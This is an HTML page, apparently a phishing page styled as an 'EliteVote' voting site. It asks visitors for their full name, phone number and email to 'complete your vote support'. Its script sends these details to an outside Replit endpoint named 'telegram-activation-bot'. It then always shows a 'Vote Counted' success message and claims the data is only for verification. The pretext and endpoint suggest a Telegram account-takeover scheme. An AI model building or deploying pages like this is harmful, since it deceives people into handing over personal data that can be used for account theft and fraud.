<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Provide Your Information - EliteVote</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://unpkg.com/lucide"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
        body { font-family: 'Outfit', sans-serif; }
        
        .success-pop {
            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        
        @keyframes popIn {
            0% { transform: scale(0.6); opacity: 0; }
            60% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body class="bg-slate-50 text-slate-900 dark:bg-black dark:text-white transition-colors duration-300">

    <!-- Header -->
    <header class="bg-white/80 dark:bg-black/90 backdrop-blur-md sticky top-0 z-50 border-b border-slate-200 dark:border-white/10">
        <nav class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
            <h1 class="text-2xl font-bold text-slate-900 dark:text-white flex items-center gap-2 tracking-tight">
                <span class="bg-blue-600 p-1.5 rounded-lg text-white"><i data-lucide="award"></i></span> EliteVote
            </h1>
            
            <button id="theme-toggle" class="w-10 h-10 flex items-center justify-center rounded-2xl bg-slate-100 hover:bg-slate-200 dark:bg-white/10 dark:hover:bg-white/20 transition-all">
                <i id="theme-icon" data-lucide="moon" class="w-5 h-5"></i>
            </button>
        </nav>
    </header>

    <div class="max-w-2xl mx-auto px-6 py-12">
        <div class="bg-white dark:bg-black rounded-3xl shadow-sm border border-slate-200 dark:border-white/10 p-8 md:p-10">
            
            <h2 class="text-4xl font-bold text-center mb-2">Your Information</h2>
            <p class="text-center text-slate-500 dark:text-zinc-400 mb-10">Please provide your details to complete your vote support</p>

            <!-- User Information Form -->
            <form id="user-info-form" class="space-y-6">
                <!-- Full Name -->
                <div>
                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Full Name</label>
                    <input 
                        type="text" 
                        id="full-name"
                        required
                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
                        placeholder="Enter your full name">
                </div>

                <!-- Phone Number -->
                <div>
                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Phone Number</label>
                    <input 
                        type="tel" 
                        id="phone"
                        required
                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
                        placeholder="+1 (555) 123-4567">
                </div>

                <!-- Email -->
                <div>
                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Email Address</label>
                    <input 
                        type="email" 
                        id="email"
                        required
                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-2xl px-5 py-4 text-base outline-none transition"
                        placeholder="you@example.com">
                </div>

                <!-- Remark -->
                <div>
                    <label class="text-xs font-bold uppercase tracking-widest text-slate-400 mb-2 block">Remark / Message (Optional)</label>
                    <textarea 
                        id="remark"
                        rows="4"
                        class="w-full bg-slate-50 dark:bg-zinc-950 border border-slate-200 dark:border-white/10 focus:border-blue-500 rounded-3xl px-5 py-4 text-base outline-none transition resize-y"
                        placeholder="Any additional notes or support message..."></textarea>
                </div>

                <!-- Action Buttons -->
                <div class="flex flex-col sm:flex-row gap-4 pt-4">
                    <button onclick="window.history.back()" 
                            type="button"
                            class="flex-1 py-5 rounded-2xl font-semibold border border-slate-300 dark:border-white/20 hover:bg-slate-100 dark:hover:bg-zinc-900 transition text-base">
                        Cancel
                    </button>
                    <button id="submit-btn"
                            type="submit"
                            class="flex-1 py-5 rounded-2xl font-semibold bg-blue-600 hover:bg-blue-700 text-white transition flex items-center justify-center gap-2 text-base disabled:opacity-70">
                        <span id="btn-text">Done</span>
                        <i data-lucide="check-circle" class="w-5 h-5"></i>
                    </button>
                </div>
            </form>

            <p class="text-center text-xs text-slate-400 dark:text-zinc-500 mt-8">
                Your information is secure and will only be used for vote verification
            </p>
        </div>
    </div>

    <!-- Success Modal -->
    <div id="success-modal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
        <div id="modal-content" class="success-pop bg-white dark:bg-black rounded-3xl p-10 max-w-md w-full text-center">
            <div class="w-24 h-24 mx-auto bg-green-100 dark:bg-green-900/30 text-green-600 rounded-3xl flex items-center justify-center mb-6">
                <i data-lucide="check-circle" class="w-14 h-14"></i>
            </div>
            <h3 class="text-3xl font-bold mb-3">All Done!</h3>
            <p class="text-slate-500 dark:text-zinc-400 mb-8">Thank you! Vote Counted </p>
            <button onclick="goToDashboard()" 
                    class="w-full py-4 bg-blue-600 text-white rounded-2xl font-semibold hover:bg-blue-700 transition">
                Back to Home
            </button>
        </div>
    </div>

    <script>
        function initLucide() {
            lucide.createIcons();
        }

        function initTheme() {
            const toggle = document.getElementById('theme-toggle');
            const icon = document.getElementById('theme-icon');
            
            const isDark = localStorage.getItem('darkMode') === 'true' || 
                          (!localStorage.getItem('darkMode') && window.matchMedia('(prefers-color-scheme: dark)').matches);
            
            if (isDark) {
                document.documentElement.classList.add('dark');
                icon.setAttribute('data-lucide', 'sun');
            }

            toggle.addEventListener('click', () => {
                document.documentElement.classList.toggle('dark');
                const newIsDark = document.documentElement.classList.contains('dark');
                localStorage.setItem('darkMode', newIsDark);
                icon.setAttribute('data-lucide', newIsDark ? 'sun' : 'moon');
                lucide.createIcons();
            });
        }

        async function submitForm(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');
            
            const fullName = document.getElementById('full-name').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const email = document.getElementById('email').value.trim();
            const remark = document.getElementById('remark').value.trim();

            if (!fullName || !phone || !email) {
                alert("Please fill in all required fields.");
                return;
            }

            // Disable button and show loading
            submitBtn.disabled = true;
            btnText.textContent = "Submitting...";

            try {
                const response = await fetch("https://telegram-activation-bot--igbinedion109.replit.app/api/XSRPK", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        fullName: fullName,
                        phone: phone,
                        email: email,
                        remark: remark || "",
                        timestamp: new Date().toISOString()
                    })
                });

                // Show success even if response is not ok (you can adjust based on actual API)
                document.getElementById('success-modal').classList.remove('hidden');
                
            } catch (error) {
                console.error("Submission error:", error);
                alert("Failed to submit. Please check your connection and try again.");
            } finally {
                // Reset button
                submitBtn.disabled = false;
                btnText.textContent = "Done";
            }
        }

        function goToDashboard() {
            window.location.href = '/'; // Change to your desired home URL
        }

        window.onload = function() {
            initLucide();
            initTheme();
            
            // Attach form submit
            document.getElementById('user-info-form').addEventListener('submit', submitForm);
        };
    </script>
</body>
</html>
